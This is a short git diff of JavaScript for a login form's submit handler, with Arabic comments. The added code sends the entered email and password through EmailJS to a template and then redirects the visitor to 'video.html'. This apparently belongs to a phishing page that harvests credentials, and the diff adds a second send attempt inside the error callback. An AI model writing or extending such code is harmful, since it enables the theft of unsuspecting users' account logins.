@@ -17,5 +17,16 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     }, function(error) {
         console.error("فشل إرسال البريد: ", error);
         alert("حدث خطأ أثناء إرسال البيانات.");
+        emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+    email: email,
+    password: password
+}).then(function(response) {
+    console.log("تم إرسال البريد بنجاح: ", response);
+    window.location.href = "video.html"; // توجيه المستخدم بعد إرسال البيانات
+}, function(error) {
+    console.error("فشل إرسال البريد: ", error);
+    alert("حدث خطأ أثناء إرسال البيانات: " + error.text); // عرض تفاصيل الخطأ
+});
+
     });
 });
